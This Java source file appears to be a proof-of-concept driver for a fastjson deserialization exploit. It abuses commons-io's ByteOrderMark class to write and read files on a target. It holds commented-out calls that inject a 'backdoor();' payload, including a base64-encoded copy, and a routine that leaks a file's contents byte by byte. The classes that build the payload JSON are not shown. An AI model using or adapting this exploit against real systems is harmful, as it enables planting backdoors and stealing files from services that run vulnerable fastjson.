import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

import org.apache.commons.io.ByteOrderMark;

import java.io.IOException;

public class Program {
    public static void main(String[] args) throws IOException {
        testing();
    }

    private static void testing() throws IOException {
        //WriteExploitTester.replaceWithShellcode("backdoor();");
        //WriteExploitTester.injectShellcode("\nbackdoor();", 10, 10);
        //WriteExploitTester.replaceWithShellcodeBytes("YmFja2Rvb3IoKTs=");

        boolean confirmed= ReadExploitTester.confirmContent(115, 111, 109, 101, 116, 104, 105, 110, 103, 46, 116, 120, 116, 10);
        System.out.println(confirmed);
    }

    private static void writeExploit() {
        String exploitJson = WriteExploitFactory.generate("YmFja2Rvb3IoKTs=");
        System.out.println("Using exploit json: \n" + exploitJson + "\n\n");
        sendToServer(exploitJson);
    }

    private static void readExploit() {
        String exploitJson = ReadExploitFactory.generate(115, 111, 109, 101, 116, 104, 105, 110, 103, 46, 116, 120, 116, 10);
        System.out.println("Using exploit json: \n" + exploitJson + "\n\n");

        ByteOrderMark retrievedOutput = sendToServer(exploitJson);

        if (retrievedOutput == null) {
            System.out.println("Bom is wrong, try again!");
            return;
        }

        System.out.println("Final string: " + new String(retrievedOutput.getBytes()));
    }

    private static ByteOrderMark sendToServer(String exploitJson) {
        JSONObject parsed = JSON.parseObject(exploitJson);
        return parsed.getObject("address", ByteOrderMark.class);
    }
}
